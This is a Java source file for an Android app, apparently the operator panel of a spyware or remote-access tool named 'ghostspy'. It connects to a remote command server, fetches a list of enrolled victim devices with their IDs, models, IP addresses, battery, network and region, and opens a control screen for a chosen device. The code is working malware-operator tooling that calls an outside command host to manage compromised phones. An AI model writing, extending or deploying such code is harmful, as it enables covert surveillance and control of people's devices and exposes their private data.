package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.TextView;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private Socket socket;
    private TextView statusText;
    private LinearLayout deviceContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        deviceContainer = findViewById(R.id.deviceContainer);
        statusText.setText("⏳ Menghubungkan...");

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {
            statusText.setText("❌ URL Error");
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            runOnUiThread(() -> {
                statusText.setText("🟢 ONLINE");
                socket.emit("get_devices");
            });
        });

        socket.on("devices_list", args -> {
            try {
                JSONArray devices = (JSONArray) args[0];
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{
                        d.getString("id"),
                        d.getString("model"),
                        d.optString("android", "?"),
                        d.optString("ip", ""),
                        d.optString("last_seen", ""),
                        d.optString("battery", "?"),
                        d.optString("network", "?"),
                        d.optString("region", "")
                    });
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    if (list.isEmpty()) {
                        statusText.setText("🟢 ONLINE | 0 perangkat");
                        return;
                    }
                    for (String[] data : list) {
                        // Card premium
                        LinearLayout card = new LinearLayout(MainActivity.this);
                        card.setOrientation(LinearLayout.VERTICAL);
                        card.setBackground(getDrawable(R.drawable.card_admin));
                        card.setPadding(20, 20, 20, 20);
                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                                LinearLayout.LayoutParams.MATCH_PARENT,
                                LinearLayout.LayoutParams.WRAP_CONTENT);
                        lp.setMargins(0, 0, 0, 12);
                        card.setLayoutParams(lp);

                        // Baris atas: nama & status
                        LinearLayout topRow = new LinearLayout(MainActivity.this);
                        topRow.setOrientation(LinearLayout.HORIZONTAL);
                        topRow.setGravity(android.view.Gravity.CENTER_VERTICAL);

                        TextView modelView = new TextView(MainActivity.this);
                        modelView.setText("📱 " + data[1]);
                        modelView.setTextColor(0xFFFFFFFF);
                        modelView.setTextSize(16);
                        modelView.setTypeface(null, android.graphics.Typeface.BOLD);
                        LinearLayout.LayoutParams modelParams = new LinearLayout.LayoutParams(
                                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
                        modelView.setLayoutParams(modelParams);

                        String lastSeen = data[4];
                        boolean online = lastSeen.contains("now") || lastSeen.contains("Just");
                        TextView statusBadge = new TextView(MainActivity.this);
                        statusBadge.setText(online ? "ONLINE" : "OFFLINE");
                        statusBadge.setTextColor(online ? 0xFF00E676 : 0xFF9AA3B2);
                        statusBadge.setTextSize(11);
                        statusBadge.setBackgroundColor(0x22000000);
                        statusBadge.setPadding(8, 4, 8, 4);

                        topRow.addView(modelView);
                        topRow.addView(statusBadge);
                        card.addView(topRow);

                        // Info tambahan
                        TextView infoView = new TextView(MainActivity.this);
                        infoView.setText("ID: " + data[0] + " | Android " + data[2] + "\nIP: " + data[3] + " | Bat: " + data[5] + "% | " + data[7]);
                        infoView.setTextColor(0xFF9AA3B2);
                        infoView.setTextSize(12);
                        card.addView(infoView);

                        // Klik perangkat -> Detail (belum ada, kita arahkan ke ControlActivity dulu)
                        card.setOnClickListener(v -> {
                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
                            i.putExtra("deviceId", data[0]);
                            i.putExtra("deviceModel", data[1]);
                            i.putExtra("battery", data[5]);
                            i.putExtra("network", data[6]);
                            startActivity(i);
                        });

                        deviceContainer.addView(card);
                    }
                    statusText.setText("🟢 ONLINE | " + list.size() + " perangkat");
                });
            } catch (Exception e) {
                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
        });

        socket.connect();
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
